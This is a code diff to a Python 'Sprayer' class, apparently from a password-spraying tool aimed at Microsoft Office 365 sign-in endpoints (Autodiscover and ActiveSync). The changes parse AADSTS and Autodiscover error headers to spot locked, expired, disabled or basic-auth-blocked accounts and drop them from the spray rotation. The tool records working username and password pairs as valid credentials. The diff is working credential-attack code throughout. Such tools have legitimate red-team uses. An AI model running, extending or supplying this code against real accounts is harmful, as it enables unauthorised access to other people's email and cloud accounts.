@@ -158,12 +158,20 @@ class Sprayer:
 
     loop = get_event_loop()
 
+    # Autodiscover data
     primary_url   = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
     primary_codes = {
         200: "VALID_CREDS",
         456: "FOUND_CREDS"
     }
+    AADSTS_codes  = {
+        # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
+        "AADSTS50053": ["LOCKED", "Account locked"],
+        "AADSTS50055": ["EXPIRED_PASS", "Password expired"],
+        "AADSTS50057": ["DISABLED", "User disabled"]
+    }
 
+    # ActiveSync data
     secondary_url   = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
     secondary_codes = {
         200: "VALID_CREDS",
@@ -205,7 +213,9 @@ class Sprayer:
             status = rsp.status_code
 
             if status in self.codes.keys():
-                if status != 200: output += " (Manually confirm [2FA, Locked, etc.])"
+                if status != 200:
+                    output += " (Manually confirm [2FA, Locked, etc.])"
+                
                 print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
                 self.valid_creds[user] = password
 
@@ -215,13 +225,25 @@ class Sprayer:
                 if status not in [401, 404]:
                     output += " (Unknown Error [%s])" % status
 
-                # TODO: Handle other AutoDiscovery error messages
+                # Handle Autodiscover errors that are returned by the server
                 if "X-AutoDiscovery-Error" in rsp.headers:
+                    err,msg = ("INVALID", password)
                     # Handle Basic Auth blocking - remove user from future rotations
-                    if any(_str in rsp.headers.get("X-AutoDiscovery-Error") for _str in ["Basic Auth Blocked", "BasicAuthBlocked"]):
-                        output = "[%s%s%s] %s:" % (text_colors.red, "BLOCKED", text_colors.reset, user)
-                        output += " Basic Auth blocked for this user. Removing from spray rotation."
+                    if any(_str in rsp.headers.get("X-AutoDiscovery-Error") for _str in ["Basic Auth Blocked","BasicAuthBlockStatus - Deny","BlockBasicAuth - User blocked"]):
+                        err = "BLOCKED"
+                        msg = " Basic Auth blocked for this user. Removing from spray rotation."
                         self.user_list.remove(user)
+
+                    else:
+                        # Handle AADSTS errors - remove user from future rotations
+                        for code in self.AADSTS_codes.keys():
+                            if code in rsp.headers.get("X-AutoDiscovery-Error"):
+                                err = self.AADSTS_codes[code][0]
+                                msg = " %s. Removing from spray rotation." % self.AADSTS_codes[code][1]
+                                self.user_list.remove(user)
+                                break
+
+                    output = "[%s%s%s] %s:%s" % (text_colors.red, err, text_colors.reset, user, msg)
 
                 print(output)
 
